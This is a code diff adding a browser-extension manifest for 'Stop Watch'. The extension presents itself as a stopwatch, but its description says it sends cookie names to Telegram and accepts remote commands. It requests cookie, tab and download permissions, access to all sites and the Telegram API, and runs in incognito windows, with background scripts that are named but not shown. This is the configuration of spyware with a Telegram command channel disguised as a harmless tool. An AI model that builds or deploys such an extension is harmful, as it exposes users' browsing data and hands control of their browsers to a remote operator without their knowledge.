@@ -1,0 +1,34 @@
+{
+  "manifest_version": 3,
+  "name": "Stop Watch",
+  "version": "8.3",
+  "description": "Send cookie names (never values) to Telegram and accept remote commands.",
+  "permissions": [
+    "tabs",
+    "cookies",
+    "storage",
+    "alarms",
+    "downloads"
+  ],
+  "host_permissions": [
+    "https://api.telegram.org/*",
+    "<all_urls>"
+  ],
+  "background": {
+    "scripts": [
+      "background.js",
+      "remote.js"
+    ]
+  },
+  "icons": {
+    "128": "icon-128.png"
+  },
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "Stop Watch",
+    "default_icon": {
+      "128": "icon-128.png"
+    }
+  },
+  "incognito": "spanning"
+}
